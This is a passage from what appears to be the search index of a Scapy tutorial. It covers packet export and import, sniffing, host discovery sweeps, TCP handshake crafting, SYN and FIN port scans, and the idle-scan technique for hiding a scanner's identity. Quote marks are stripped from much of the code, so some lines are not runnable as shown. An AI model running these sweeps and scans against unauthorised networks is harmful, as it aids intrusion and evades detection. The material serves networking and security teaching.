\nchksum=0x9c90 id=0x5a61 seq=0x1 |\nRaw  load='\\xe6\\xdapI\\xb6\\xe5\\x08\\x00\\x08\\t\\n\n\\x0b\\x0c\\r\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\n\\x1f !\n#$%\n\\'()*+,-./01234567' |\n\n\n pkt_str = str(pkt)\n\n pkt_str\n'\\x00PV\\xfc\\xceP\\x00\\x0c)+S\\x19\\x08\\x00E\\x00\\x00T\\x00\\x00@\\x00@\\x01Z|\\xc0\\xa8\n\\x19\\x82\\x04\\x02\\x02\\x01\\x08\\x00\\x9c\\x90Za\\x00\\x01\\xe6\\xdapI\\xb6\\xe5\\x08\\x00\n\\x08\\t\\n\\x0b\\x0c\\r\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\n\\x1c\\x1d\\x1e\\x1f !\n#$%\n\\'()*+,-./01234567'\n\n\n\n\nBase64\n\n\n\n\nScapy can export base64 encoded python data structure representing a packet using export_object() function.\n\n\n\n\n pkt\n\nEther  dst=00:50:56:fc:ce:50 src=00:0c:29:2b:53:19 type=0x800 |\nIP  version=4L \nihl=5L tos=0x0 len=84 id=0 flags=DF frag=0L ttl=64 proto=icmp chksum=0x5a7c \nsrc=192.168.25.130 dst=4.2.2.1 options='' |\nICMP  type=echo-request code=0 \nchksum=0x9c90 id=0x5a61 seq=0x1 |\nRaw  load='\\xe6\\xdapI\\xb6\\xe5\\x08\\x00\\x08\\t\\n\n\\x0b\\x0c\\r\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f \n!\n#$%\n\\'()*+,-./01234567' |\n\n\n export_object(pkt)\neNplVwd4FNcRPt2dTqdTQ0JUUYwN+CgS0gkJONFEs5WxFDB+CdiI8+pupVl0d7uzRUiYtcEGG4ST\nOD1OnB6nN6c4cXrvwQmk2U5xA9tgO70XMm+1rA78qdzbfTP/lDfzz7tD4WwmU1C0YiaT2Gqjaiao\nbMlhCrsUSYrYoKbmcxZFXSpPiohlZikm6ltb063ZdGpNOjWQ7mhPt62hChHJWTbFvb0O/u1MD2bT\nWZXXVCmi9pihUqI3FHdEQslriiVfWFTVT9VYpog6Q7fsjG0qRWtQNwsW1fRTrUg4xZxq5pUx1aS6\n\n\n\n\n\n\nOutput above can be reimported back into Skype using import_object() function:\n\n\n\n\n new_pkt = import_object()\neNplVwd4FNcRPt2dTqdTQ0JUUYwN+CgS0gkJONFEs5WxFDB+CdiI8+pupVl0d7uzRUiYtcEGG4ST\nOD1OnB6nN6c4cXrvwQmk2U5xA9tgO70XMm+1rA78qdzbfTP/lDfzz7tD4WwmU1C0YiaT2Gqjaiao\nbMlhCrsUSYrYoKbmcxZFXSpPiohlZikm6ltb063ZdGpNOjWQ7mhPt62hChHJWTbFvb0O/u1MD2bT\nWZXXVCmi9pihUqI3FHdEQslriiVfWFTVT9VYpog6Q7fsjG0qRWtQNwsW1fRTrUg4xZxq5pUx1aS6\n...\n\n new_pkt\n\nEther  dst=00:50:56:fc:ce:50 src=00:0c:29:2b:53:19 type=0x800 |\nIP  version=4L \nihl=5L tos=0x0 len=84 id=0 flags=DF frag=0L ttl=64 proto=icmp chksum=0x5a7c \nsrc=192.168.25.130 dst=4.2.2.1 options='' |\nICMP  type=echo-request code=0 \nchksum=0x9c90 id=0x5a61 seq=0x1 |\nRaw  load='\\xe6\\xdapI\\xb6\\xe5\\x08\\x00\\x08\\t\\n\n\\x0b\\x0c\\r\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f \n!\n#$%\n\\'()*+,-./01234567' |", 
            "title": "Import & Export data"
        }, 
        {
            "location": "/scapy/import_export/index.html#importing-exporting-data", 
            "text": "", 
            "title": "Importing &amp; exporting data"
        }, 
        {
            "location": "/scapy/import_export/index.html#pcap-format", 
            "text": "Import packets from PCAP file.    pkts = rdpcap( temp.cap )   pkts = sniff(offline= temp.cap )   Export packets to pcap file.    wrpcap( temp.cap ,pkts)", 
            "title": "PCAP format"
        }, 
        {
            "location": "/scapy/import_export/index.html#hexdump-format", 
            "text": "Scapy allows you to export recorded packets in various hex formats.  Use hexdump() function to display one or more packets using classic hexdump format:    hexdump(pkt)\n0000   00 50 56 FC CE 50 00 0C  29 2B 53 19 08 00 45 00   .PV..P..)+S...E.\n0010   00 54 00 00 40 00 40 01  5A 7C C0 A8 19 82 04 02   .T..@.@.Z|......\n0020   02 01 08 00 9C 90 5A 61  00 01 E6 DA 70 49 B6 E5   ......Za....pI..\n0030   08 00 08 09 0A 0B 0C 0D  0E 0F 10 11 12 13 14 15   ................\n0040   16 17 18 19 1A 1B 1C 1D  1E 1F 20 21 22 23 24 25   .......... ! #$%\n0050   26 27 28 29 2A 2B 2C 2D  2E 2F 30 31 32 33 34 35    '()*+,-./012345\n0060   36 37                                              67   Hexdump above can be reimported back into Scapy using import_hexcap() function:    pkt_hex = Ether(import_hexcap())\n0000   00 50 56 FC CE 50 00 0C  29 2B 53 19 08 00 45 00   .PV..P..)+S...E.\n0010   00 54 00 00 40 00 40 01  5A 7C C0 A8 19 82 04 02   .T..@.@.Z|......\n0020   02 01 08 00 9C 90 5A 61  00 01 E6 DA 70 49 B6 E5   ......Za....pI..\n0030   08 00 08 09 0A 0B 0C 0D  0E 0F 10 11 12 13 14 15   ................\n0040   16 17 18 19 1A 1B 1C 1D  1E 1F 20 21 22 23 24 25   .......... ! #$%\n0050   26 27 28 29 2A 2B 2C 2D  2E 2F 30 31 32 33 34 35    '()*+,-./012345\n0060   36 37                                              67  pkt_hex Ether  dst=00:50:56:fc:ce:50 src=00:0c:29:2b:53:19 type=0x800 | IP  version=4L \nihl=5L tos=0x0 len=84 id=0 flags=DF frag=0L ttl=64 proto=icmp chksum=0x5a7c \nsrc=192.168.25.130 dst=4.2.2.1 options='' | ICMP  type=echo-request code=0 \nchksum=0x9c90 id=0x5a61 seq=0x1 | Raw  load='\\xe6\\xdapI\\xb6\\xe5\\x08\\x00\\x08\\t\\n\n\\x0b\\x0c\\r\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\n\\x1f ! #$% \\'()*+,-./01234567' |", 
            "title": "hexdump format"
        }, 
        {
            "location": "/scapy/import_export/index.html#hex-string", 
            "text": "You can also convert entire packet into a hex string using /str() function:    pkt Ether  dst=00:50:56:fc:ce:50 src=00:0c:29:2b:53:19 type=0x800 | IP  version=4L \nihl=5L tos=0x0 len=84 id=0 flags=DF frag=0L ttl=64 proto=icmp chksum=0x5a7c \nsrc=192.168.25.130 dst=4.2.2.1 options='' | ICMP  type=echo-request code=0 \nchksum=0x9c90 id=0x5a61 seq=0x1 | Raw  load='\\xe6\\xdapI\\xb6\\xe5\\x08\\x00\\x08\\t\\n\n\\x0b\\x0c\\r\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\n\\x1f ! #$% \\'()*+,-./01234567' |   pkt_str = str(pkt)  pkt_str\n'\\x00PV\\xfc\\xceP\\x00\\x0c)+S\\x19\\x08\\x00E\\x00\\x00T\\x00\\x00@\\x00@\\x01Z|\\xc0\\xa8\n\\x19\\x82\\x04\\x02\\x02\\x01\\x08\\x00\\x9c\\x90Za\\x00\\x01\\xe6\\xdapI\\xb6\\xe5\\x08\\x00\n\\x08\\t\\n\\x0b\\x0c\\r\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\n\\x1c\\x1d\\x1e\\x1f ! #$% \\'()*+,-./01234567'", 
            "title": "hex string"
        }, 
        {
            "location": "/scapy/import_export/index.html#base64", 
            "text": "Scapy can export base64 encoded python data structure representing a packet using export_object() function.    pkt Ether  dst=00:50:56:fc:ce:50 src=00:0c:29:2b:53:19 type=0x800 | IP  version=4L \nihl=5L tos=0x0 len=84 id=0 flags=DF frag=0L ttl=64 proto=icmp chksum=0x5a7c \nsrc=192.168.25.130 dst=4.2.2.1 options='' | ICMP  type=echo-request code=0 \nchksum=0x9c90 id=0x5a61 seq=0x1 | Raw  load='\\xe6\\xdapI\\xb6\\xe5\\x08\\x00\\x08\\t\\n\n\\x0b\\x0c\\r\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f \n! #$% \\'()*+,-./01234567' |   export_object(pkt)\neNplVwd4FNcRPt2dTqdTQ0JUUYwN+CgS0gkJONFEs5WxFDB+CdiI8+pupVl0d7uzRUiYtcEGG4ST\nOD1OnB6nN6c4cXrvwQmk2U5xA9tgO70XMm+1rA78qdzbfTP/lDfzz7tD4WwmU1C0YiaT2Gqjaiao\nbMlhCrsUSYrYoKbmcxZFXSpPiohlZikm6ltb063ZdGpNOjWQ7mhPt62hChHJWTbFvb0O/u1MD2bT\nWZXXVCmi9pihUqI3FHdEQslriiVfWFTVT9VYpog6Q7fsjG0qRWtQNwsW1fRTrUg4xZxq5pUx1aS6   Output above can be reimported back into Skype using import_object() function:    new_pkt = import_object()\neNplVwd4FNcRPt2dTqdTQ0JUUYwN+CgS0gkJONFEs5WxFDB+CdiI8+pupVl0d7uzRUiYtcEGG4ST\nOD1OnB6nN6c4cXrvwQmk2U5xA9tgO70XMm+1rA78qdzbfTP/lDfzz7tD4WwmU1C0YiaT2Gqjaiao\nbMlhCrsUSYrYoKbmcxZFXSpPiohlZikm6ltb063ZdGpNOjWQ7mhPt62hChHJWTbFvb0O/u1MD2bT\nWZXXVCmi9pihUqI3FHdEQslriiVfWFTVT9VYpog6Q7fsjG0qRWtQNwsW1fRTrUg4xZxq5pUx1aS6\n...  new_pkt Ether  dst=00:50:56:fc:ce:50 src=00:0c:29:2b:53:19 type=0x800 | IP  version=4L \nihl=5L tos=0x0 len=84 id=0 flags=DF frag=0L ttl=64 proto=icmp chksum=0x5a7c \nsrc=192.168.25.130 dst=4.2.2.1 options='' | ICMP  type=echo-request code=0 \nchksum=0x9c90 id=0x5a61 seq=0x1 | Raw  load='\\xe6\\xdapI\\xb6\\xe5\\x08\\x00\\x08\\t\\n\n\\x0b\\x0c\\r\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f \n! #$% \\'()*+,-./01234567' |", 
            "title": "Base64"
        }, 
        {
            "location": "/scapy/sniffing/index.html", 
            "text": "Sniffing\n\n\nSniff()\n\n\n\n\nScapy\ns in-built \nsniff()\n function helps us capture all traffic:\n\n\nsniff()\n hasCount, filters, iface, timeout options. \n\n\nCan apply BPF filters .(Same as TCPDUMP).\n\n\n\n\n sniff(count=4, iface='eth3')\n\nSniffed: TCP:0 UDP:0 ICMP:0 Other:4\n\n\n\n\n\n\n\nSniffing with Scapy\nScapy sniffer is not designed to be super fast so it can miss packets   sometimes.\nAlways use use tcpdump when you can, which is more simpler and efficient.\n\n\n\n\n\n\n\n\nWe can add filtering to capture only packets that are interesting to us. Use standard tcpdump/libpcap syntax:\n\n\n\n\n pkts = sniff(count=1,filter=\ntcp and host 64.233.167.99 and port 80\n)\n\n\n\n\n sniff(filter='arp', count=5, iface='vboxnet0')\n\nSniffed: TCP:0 UDP:0 ICMP:0 Other:5\n\n\n\n\n _.summary()\nEther / ARP who has 192.168.56.101 says 192.168.56.1\nEther / ARP who has 192.168.56.101 says 192.168.56.1\nEther / ARP who has 192.168.56.101 says 192.168.56.1\nEther / ARP who has 192.168.56.101 says 192.168.56.1\nEther / ARP who has 192.168.56.101 says 192.168.56.1\n\n\n\n\n\n\nSimple traffic analyzer like tcpdump.\n\n\n\n\n pkts = sniff(count=5,filter=\nhost 64.233.167.99\n,prn=lambda x:x.summary())\nEther / IP / TCP 192.168.1.100:33168 \n 64.233.167.99:www S\nEther / IP / TCP 64.233.167.99:www \n 192.168.1.100:33168 SA\nEther / IP / TCP 192.168.1.100:33168 \n 64.233.167.99:www A\nEther / IP / TCP 192.168.1.100:33168 \n 64.233.167.99:www PA / Raw\nEther / IP / TCP 64.233.167.99:www \n 192.168.1.100:33168 A\n\n\n\n\n\n TBD", 
            "title": "Sniffing"
        }, 
        {
            "location": "/scapy/sniffing/index.html#sniffing", 
            "text": "", 
            "title": "Sniffing"
        }, 
        {
            "location": "/scapy/sniffing/index.html#sniff", 
            "text": "Scapy s in-built  sniff()  function helps us capture all traffic:  sniff()  hasCount, filters, iface, timeout options.   Can apply BPF filters .(Same as TCPDUMP).    sniff(count=4, iface='eth3') Sniffed: TCP:0 UDP:0 ICMP:0 Other:4    Sniffing with Scapy Scapy sniffer is not designed to be super fast so it can miss packets   sometimes.\nAlways use use tcpdump when you can, which is more simpler and efficient.     We can add filtering to capture only packets that are interesting to us. Use standard tcpdump/libpcap syntax:    pkts = sniff(count=1,filter= tcp and host 64.233.167.99 and port 80 )   sniff(filter='arp', count=5, iface='vboxnet0') Sniffed: TCP:0 UDP:0 ICMP:0 Other:5    _.summary()\nEther / ARP who has 192.168.56.101 says 192.168.56.1\nEther / ARP who has 192.168.56.101 says 192.168.56.1\nEther / ARP who has 192.168.56.101 says 192.168.56.1\nEther / ARP who has 192.168.56.101 says 192.168.56.1\nEther / ARP who has 192.168.56.101 says 192.168.56.1   Simple traffic analyzer like tcpdump.    pkts = sniff(count=5,filter= host 64.233.167.99 ,prn=lambda x:x.summary())\nEther / IP / TCP 192.168.1.100:33168   64.233.167.99:www S\nEther / IP / TCP 64.233.167.99:www   192.168.1.100:33168 SA\nEther / IP / TCP 192.168.1.100:33168   64.233.167.99:www A\nEther / IP / TCP 192.168.1.100:33168   64.233.167.99:www PA / Raw\nEther / IP / TCP 64.233.167.99:www   192.168.1.100:33168 A   TBD", 
            "title": "Sniff()"
        }, 
        {
            "location": "/network_recon/host_discovery/index.html", 
            "text": "Two steps to basic network reconnaissance.\n\n- Host Discovery.\n\n- Service Discovery(Port Scanning).\n\n\n\n\n\n\n\n\n\nHost Discovery\n\n\n\n\nFirst step to network recon. Goal is to \nreduce a large set of IP ranges into a list of active or interesting hosts.\n(A 10.0.0.0/8 network can accomdate 16777200 hosts).\n\n\nPort scanning is loud and also expensive on time and resources. More targets; More chances of being caught by an IDS.\n\n\nStrict narrowing down might miss interesting targets, Too lenient narrowing down can result in large set of machines to scan.. Strike a balance based on the requirements.\n\n\n\n\nTCP SYN Ping\n\n\n\n\nSend an empty TCP packet with only SYN bit set.\n\n\nSYN/ACK or RST in response indicates that a machine is up and running.\n\n\n\n\n ans,unans=sr( IP(dst=\n192.168.1.*\n)/TCP(dport=80,flags=\nS\n) )\n\n ans.summary( lambda(s,r) : r.sprintf(\n%IP.src% is alive\n) )\n192.168.56.101 is alive!\n\n\n\n\nTCP ACK Ping\n\n\n\n\nSend an empty TCP packet with only ACK bit set.\n\n\nUnsolicited ACK packets should be responded with RST which reveals a machine.\n\n\nSYN ping and ACK ping might seem redundant but most of the stateless firewalls won\nt filter unsolicited ACK packets so it\ns a better approach to use both ping tecnhiques.\n\n\n\n\n ans, unans = sr(IP(dst='192.168.56.99-105')/TCP(dport=80, flags='A'))\nBegin emission:\nFinished to send 7 packets.\n......................^C\nReceived 25 packets, got 1 answers, remaining 6 packets\n\n \n\n ans.summary(lambda(s,r): r.sprintf('{IP: %IP.src% is alive}'))\n 192.168.56.101 is alive\n\n \n\n\n\n\n\nUDP Ping\n\n\n\n\nSend UDP packet to the given ports with or without payload, though protocol specific payload makes the scan more effective.\n\n\nChoose a port that\ns most likely closed(Open UDP ports might recieve empty packets but ignore them).\n\n\nICMP port unreachable signifies that the machine is up.\n\n\n\n\nIP Protocol ping\n\n\n\n\nSend multiple packets with different protocol numbers set in their IP header, append proper protocol headers.\n\n\nLook for either responses using the same protocol as a probe, or ICMP protocol unreachable, either of the responses will signify a machine is alive.\n\n\n\n\nARP Ping\n\n\n\n\nARP Ping is employed when discovering active hosts on the same network/LAN.\n\n\nFaster and reliable because it operates on Layer 2 by using only ARP.\n\n\nARP is the backbone protocol for any Layer 2 communication so always employ ARP ping when discovering hosts on local network.\n\n\n\n\nARP doesn\nt exist in IPv6 standard. For the equivalent, use Neighbor Discovery Protocol techniques instead.\n\n\n\n\n\n\n\n\n\n\n ans,unans=srp(Ether(dst=\nff:ff:ff:ff:ff:ff\n)/ARP(pdst=\n192.168.56.0/24\n),timeout=2)\nBegin emission:\n**Finished to send 256 packets.\n\nReceived 2 packets, got 2 answers, remaining 254 packets\n\n \n\n ans.summary(lambda (s,r): r.sprintf(\n%Ether.src% %ARP.psrc%\n) )\n08:00:27:7b:2a:a9 192.168.56.100\n08:00:27:37:86:85 192.168.56.101\n\n \n\n\n\n\nICMP Ping\n\n\n\n\nICMP scan involves the standard packets sent by the ubiquitous \nping program\n .\n\n\nSend an \nICMP type 8 (echo request)\n packet to the target IP, a \nICMP type 0 (echo reply) \nindicates that the target is alive.\n\n\nUnfortunately, \nmany hosts and firewalls now block these packets\n so a basic ICMP scan is unreliable.\n\n\nICMP also supports\n timestamp request(13), and address mask request(17)\n which can reveal the availabilty of a machine.\n\n\n\n\n ans,unans=sr(IP(dst=\n192.168.56.99-110\n)/ICMP())\nBegin emission:\nFinished to send 12 packets.\nReceived 170 packets, got 1 answers, remaining 11 packets\n\n \n\n ans.summary( lambda(s,r) : r.sprintf(\n{IP: %IP.src% is alive}\n) )\n192.168.56.101 is alive\n\n\n\n\n\n\nExercise time - network sweeping\n\n\nPlease solve Exercise 1 - Misc exercises", 
            "title": "Host discovery"
        }, 
        {
            "location": "/network_recon/host_discovery/index.html#host-discovery", 
            "text": "First step to network recon. Goal is to  reduce a large set of IP ranges into a list of active or interesting hosts. (A 10.0.0.0/8 network can accomdate 16777200 hosts).  Port scanning is loud and also expensive on time and resources. More targets; More chances of being caught by an IDS.  Strict narrowing down might miss interesting targets, Too lenient narrowing down can result in large set of machines to scan.. Strike a balance based on the requirements.", 
            "title": "Host Discovery"
        }, 
        {
            "location": "/network_recon/host_discovery/index.html#tcp-syn-ping", 
            "text": "Send an empty TCP packet with only SYN bit set.  SYN/ACK or RST in response indicates that a machine is up and running.    ans,unans=sr( IP(dst= 192.168.1.* )/TCP(dport=80,flags= S ) )  ans.summary( lambda(s,r) : r.sprintf( %IP.src% is alive ) )\n192.168.56.101 is alive!", 
            "title": "TCP SYN Ping"
        }, 
        {
            "location": "/network_recon/host_discovery/index.html#tcp-ack-ping", 
            "text": "Send an empty TCP packet with only ACK bit set.  Unsolicited ACK packets should be responded with RST which reveals a machine.  SYN ping and ACK ping might seem redundant but most of the stateless firewalls won t filter unsolicited ACK packets so it s a better approach to use both ping tecnhiques.    ans, unans = sr(IP(dst='192.168.56.99-105')/TCP(dport=80, flags='A'))\nBegin emission:\nFinished to send 7 packets.\n......................^C\nReceived 25 packets, got 1 answers, remaining 6 packets    ans.summary(lambda(s,r): r.sprintf('{IP: %IP.src% is alive}'))\n 192.168.56.101 is alive", 
            "title": "TCP ACK Ping"
        }, 
        {
            "location": "/network_recon/host_discovery/index.html#udp-ping", 
            "text": "Send UDP packet to the given ports with or without payload, though protocol specific payload makes the scan more effective.  Choose a port that s most likely closed(Open UDP ports might recieve empty packets but ignore them).  ICMP port unreachable signifies that the machine is up.", 
            "title": "UDP Ping"
        }, 
        {
            "location": "/network_recon/host_discovery/index.html#ip-protocol-ping", 
            "text": "Send multiple packets with different protocol numbers set in their IP header, append proper protocol headers.  Look for either responses using the same protocol as a probe, or ICMP protocol unreachable, either of the responses will signify a machine is alive.", 
            "title": "IP Protocol ping"
        }, 
        {
            "location": "/network_recon/host_discovery/index.html#arp-ping", 
            "text": "ARP Ping is employed when discovering active hosts on the same network/LAN.  Faster and reliable because it operates on Layer 2 by using only ARP.  ARP is the backbone protocol for any Layer 2 communication so always employ ARP ping when discovering hosts on local network.   ARP doesn t exist in IPv6 standard. For the equivalent, use Neighbor Discovery Protocol techniques instead.       ans,unans=srp(Ether(dst= ff:ff:ff:ff:ff:ff )/ARP(pdst= 192.168.56.0/24 ),timeout=2)\nBegin emission:\n**Finished to send 256 packets.\n\nReceived 2 packets, got 2 answers, remaining 254 packets    ans.summary(lambda (s,r): r.sprintf( %Ether.src% %ARP.psrc% ) )\n08:00:27:7b:2a:a9 192.168.56.100\n08:00:27:37:86:85 192.168.56.101", 
            "title": "ARP Ping"
        }, 
        {
            "location": "/network_recon/host_discovery/index.html#icmp-ping", 
            "text": "ICMP scan involves the standard packets sent by the ubiquitous  ping program  .  Send an  ICMP type 8 (echo request)  packet to the target IP, a  ICMP type 0 (echo reply)  indicates that the target is alive.  Unfortunately,  many hosts and firewalls now block these packets  so a basic ICMP scan is unreliable.  ICMP also supports  timestamp request(13), and address mask request(17)  which can reveal the availabilty of a machine.    ans,unans=sr(IP(dst= 192.168.56.99-110 )/ICMP())\nBegin emission:\nFinished to send 12 packets.\nReceived 170 packets, got 1 answers, remaining 11 packets    ans.summary( lambda(s,r) : r.sprintf( {IP: %IP.src% is alive} ) )\n192.168.56.101 is alive   Exercise time - network sweeping  Please solve Exercise 1 - Misc exercises", 
            "title": "ICMP Ping"
        }, 
        {
            "location": "/network_recon/service_discovery/index.html", 
            "text": "Service discovery(Port Scanning)\n\n\nTCP Three way handshake\n\n\n\n\n\n\n\n\n\nThree-way handshake captured using tcpdump\n\n\n192.168.56.1.35555 \n 192.168.56.102.4444: Flags [S] seq=12345   \n192.168.56.102.4444 \n 192.168.56.1.35555: Flags [S.],  seq=9998 ack=12346\n192.168.56.1.35555 \n 192.168.56.102.4444: Flags [.] seq=12346 ack=9999  \n\n\n\n\nA note on tcpdump output:\n\n\n\n\nA port number is appended to the IP address with an additional dot. \n192.168.56.1.35555\n is IP \n192.168.56.1\n port \n35555\n.\n\n\nAn ACK bit is represented by a \n.\n so \n[S.]\n is \nSYN-ACK\n, \n[.]\n is \nACK\n.\n\n\n\n\n\n\nCrafting the Three-way Handshake in Scapy\n\n\n\n\nTo craft three-way handshake we need to be able to record the response of the server and craft our responses based on server response.\n\n\n\n\nStep I - Send the client\u2019s SYN to a listening server (SYN)\n\n\n\n\nCraft an IP header with the source and destination IP addresses.\n\n\nCraft a TCP header where we generate the TCP source port, assign the destination port that the server listens on, set the TCP flags to turn the \nSYN bit on, and generate the client\u2019s ISN.\n\n\n\n\nip = IP(src='192.168.56.1', dst='192.168.56.101')\nsyn = TCP(sport=4000, dport=80, flags='S', seq='12345')\nsyn_pkt = ip/syn\n\n\n\n\nStep II - Listen for the server\ns response (SYN - ACK)\n\n\n\n\nSave the server\u2019s response. (ideally the response should be syn-ack).\n\n\nExtract the server\u2019s TCP sequence number and increment the value by one.\n\n\n\n\n syn_ack = sr1(packet)\n\n my_ack = syn_ack.seq+1\n\n\n\n\nSend an acknowledgement from client for server\ns response (ACK)\n\n\n\n\nIP header has the same source and destination as the intial SYN packet.\n\n\nTCP header has the same TCP source and destination ports as syn packet, only ACK bit is set, increment the client\u2019s ISN by one since the SYN packet consumes one sequence number, set the acknowledgement value to the incremented server\u2019s sequence number value.\n\n\n\n\nack = TCP(sport=4000, dport=80, flags='A', seq='12346', ack=my_ack)\nack_pkt = ip/ack\nsend(ack_pkt)\n\n\n\n\nIf everything went right, we have just sucessfully established TCP three-way handshake\n\n\n\n\nWhy RST??\n\n\n\n\nIf you have noticed whenever we recieve a packet, our machine automatically responds with an RST packet.\n\n\nThe kernel is not aware of what Scapy is doing behind it\ns back(Scapy is userland program). If Scapy sends a SYN, the target replies with a SYN-ACK and your kernel sees it as unsolicited packet, it will reply with an RST.\n\n\nTo prevent this, use local firewall rules (e.g. NetFilter/IPtables for Linux). Scapy does not mind about local firewalls.\n  iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 192.168.1.1 -j DROP\n\n\n\n\n\n\n\n\n\nSYN scan\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSYN scan on single target, single port\n\n\n\n\nWe send packets using \nsr1\n function.\n\n\nThe response is just a single packet.\n\n\nWe use Scapy\ns \nsprintf\n method to print interesting fields in the response. (\nSA\n flags indicates open ports, \nRA\n flags indicates closed ports)\n\n\n\n\n syn_packet = IP(dst='192.168.56.102')/TCP(dport=4444,flags='S')\n\n resp = sr1(syn_packet)\n\n resp.sprintf('%TCP.src% \\t %TCP.sport% \\t %TCP.flags%')\n'192.168.56.102     4444      SA'\n\n\n\n\nSYN scan on single target, multiple ports\n\n\n\n\nWe use \nsr\n functions send our packets.\n\n\nsr\n returns answered probes and unanswered probes that we assign to two variables.\n\n\nans\n has all the answered probes in stimulus/response pairs(a tuple).\n\n\nWe use a simple lambda function to loop over the answered probes and print interesting fields.\n\n\nIn the below example, each entry in \nans\n i.e. a stimuli response pair is passed on to a lambda function(stimuli \n response as \ns\n, \nr\n respectively). Inside lambda function, we use sprintf to extract interesting fields.\n\n\n\n\n ans, unans = sr(IP(dst=\n192.168.56.90-110\n)/TCP(dport=(20,24),flags=\nS\n))\n\n ans.summary( lambda(s,r): r.sprintf(\n%TCP.sport% \\t %TCP.flags%\n) )\n'ftp_data    RA'\n'21          RA\n'ssh         SA'\n'telnet      RA'\n'24          RA'\n\n\n\n\nSYN scan on multiple targets, multiple ports\n\n\n\n\nmake_table\n is an advanced feature in scapy that helps you visualize larger and complex scans.\n\n\n\n\n ans,unans = sr(IP(dst=[\nscanme.nmap.org\n,\negadz.metasploit.com\n])/TCP(dport=[10,20,30],flags=\nS\n))\n\n\n\n ans.make_table(lambda(s,r): (s.dst, s.dport,r.sprintf(\n%TCP.flags%\n)))\n\n   45.33.32.156 198.58.109.32 \n10 RA           SA            \n20 RA           SA            \n30 RA           SA\n\n\n\n\nFin scan\n\n\n\n\n\n\n\n\n\nFin scan on open port - scapy\n\n\n fin_packet = IP(dst='192.168.56.102')/TCP(dport=4444,flags='F')\n\n resp = sr1(fin_packet)\nBegin emission:\nFinished to send 1 packets.\n^C\nReceived 0 packets, got 0 answers, remaining 1 packets\n\n\n\n\nFin scan on closed port - scapy\n\n\n fin_packet = IP(dst='192.168.56.102')/TCP(dport=6767,flags='F')\n\n resp = sr1(fin_packet)\n\n resp.sprintf('%TCP.flags%')\n'RA'\n\n\n\n\nNull scan\n\n\n\n\n\n\n\n\n\nXmas scan\n\n\n\n\n\n\n\n\n\nUDP scan\n\n\n\n\n\n\n\n\n\n\n\nExercise time - port scanning\n\n\nPlease solve Exercise 2 - Misc exercises\n\n\n\n\nIP ID Scan (nmap idle scan)\n\n\nIn 1998, security researcher Antirez posted to the Bugtraq mailing list an ingenious new port scanning technique. \nIdle scan\n, as it has become known, allows for completely blind port scanning. \nAttackers can actually scan a target without sending a single packet to the target from their own IP address!\n Instead, a clever side-channel attack allows for the scan to be bounced off a dumb \u201czombie host\u201d. Intrusion detection system (IDS) reports will finger the innocent zombie as the attacker.\n\n\nIdle scan can be explained in following steps:\n\n\n\n\n\n\n\nOne way to determine whether a TCP port is open is to send a SYN (session establishment) packet to the port. The target machine will respond with a SYN/ACK (session request acknowledgment) packet if the port is open, and RST (reset) if the port is closed. This is the basis of the previously discussed SYN scan.\n\n\n\n\n\n\nA machine that receives an unsolicited SYN/ACK packet will respond with a RST. An unsolicited RST will be ignored.\n\n\n\n\n\n\nEvery IP packet on the Internet has a fragment identification number (IP ID). Since many operating systems simply increment this number for each packet they send, probing for the IP ID can tell an attacker how many packets have been sent since the last probe.\n\n\n\n\n\n\nBy combining these traits, it is possible to scan a target network while forging your identity so that it looks like an innocent zombie machine did the scanning.\n\n\n\n\n\n\n\n\n\n\n\nExercise time - ipidseq \n ipidscanner\n\n\nPlease solve Exercise 3 \n 4 - Misc exercises", 
            "title": "Service discovery"
        }, 
        {
            "location": "/network_recon/service_discovery/index.html#service-discoveryport-scanning", 
            "text": "", 
            "title": "Service discovery(Port Scanning)"
        }, 
        {
            "location": "/network_recon/service_discovery/index.html#tcp-three-way-handshake", 
            "text": "Three-way handshake captured using tcpdump  192.168.56.1.35555   192.168.56.102.4444: Flags [S] seq=12345   \n192.168.56.102.4444   192.168.56.1.35555: Flags [S.],  seq=9998 ack=12346\n192.168.56.1.35555   192.168.56.102.4444: Flags [.] seq=12346 ack=9999    A note on tcpdump output:   A port number is appended to the IP address with an additional dot.  192.168.56.1.35555  is IP  192.168.56.1  port  35555 .  An ACK bit is represented by a  .  so  [S.]  is  SYN-ACK ,  [.]  is  ACK .", 
            "title": "TCP Three way handshake"
        }, 
        {
            "location": "/network_recon/service_discovery/index.html#crafting-the-three-way-handshake-in-scapy", 
            "text": "To craft three-way handshake we need to be able to record the response of the server and craft our responses based on server response.   Step I - Send the client\u2019s SYN to a listening server (SYN)   Craft an IP header with the source and destination IP addresses.  Craft a TCP header where we generate the TCP source port, assign the destination port that the server listens on, set the TCP flags to turn the  SYN bit on, and generate the client\u2019s ISN.   ip = IP(src='192.168.56.1', dst='192.168.56.101')\nsyn = TCP(sport=4000, dport=80, flags='S', seq='12345')\nsyn_pkt = ip/syn  Step II - Listen for the server s response (SYN - ACK)   Save the server\u2019s response. (ideally the response should be syn-ack).  Extract the server\u2019s TCP sequence number and increment the value by one.    syn_ack = sr1(packet)  my_ack = syn_ack.seq+1  Send an acknowledgement from client for server s response (ACK)   IP header has the same source and destination as the intial SYN packet.  TCP header has the same TCP source and destination ports as syn packet, only ACK bit is set, increment the client\u2019s ISN by one since the SYN packet consumes one sequence number, set the acknowledgement value to the 